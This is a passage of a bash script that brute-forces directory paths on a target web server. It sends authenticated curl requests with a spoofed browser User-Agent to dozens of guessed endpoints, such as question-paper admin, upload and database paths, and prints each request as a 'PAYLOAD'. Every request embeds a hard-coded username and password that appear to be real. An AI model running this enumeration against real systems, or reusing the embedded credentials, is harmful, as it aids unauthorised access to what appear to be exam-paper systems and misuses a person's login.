" "${target}QPDatabase_Service/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_Service/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QsnPaperTransfer/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QsnPaperTransfer/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QsnPaperTransfer/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-CloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-CloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-CloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabase_UploadService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabase_UploadService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabase_UploadService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPProcessing_Sync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPProcessing_Sync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPProcessing_Sync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [FileProcessorQPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}FileProcessorQPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileProcessorQPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster_FileUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster_FileUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster_FileUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperMonitoring/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperMonitoring/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperMonitoring/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin-Upload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin-Upload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin-Upload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [TestPaper_AccessControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}TestPaper_AccessControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}TestPaper_AccessControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Platform-QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Platform-QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Platform-QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAdmin_Upload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAdmin_Upload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAdmin_Upload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [System-QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}System-QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}System-QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPMonitor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPMonitor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPMonitor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager-QPaperDoc/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager-QPaperDoc/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager-QPaperDoc/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBFile_Admin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBFile_Admin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBFile_Admin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-Module/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-Module/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-Module/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management-ExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management-ExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management-ExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service-QPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service-QPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service-QPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ProcessingSuite_QPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ProcessingSuite_QPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ProcessingSuite_QPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPDatabase/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPDatabase/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPDatabase/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Panel_QPBulk/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Panel_QPBulk/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Panel_QPBulk/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SyncQPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SyncQPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SyncQPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPSystem_Module/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPSystem_Module/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPSystem_Module/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Ops_QstnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QstnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QstnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPaperDocMassUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPaperDocMassUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPaperDocMassUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper_Handler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper_Handler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper_Handler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutomationSystem-QsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutomationSystem-QsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutomationSystem-QsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPBData/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPBData/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPBData/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Processing_QPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Processing_QPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Processing_QPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUpload-QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUpload-QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUpload-QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOpsQPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOpsQPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOpsQPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MassUploadQPFile/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MassUploadQPFile/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MassUploadQPFile/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control_QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control_QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Control_QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Transfer/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Transfer/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Transfer/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPMaster-Mgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPMaster-Mgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPMaster-Mgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaper-AutomationSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaper-AutomationSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaper-AutomationSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Control-QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Control-QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
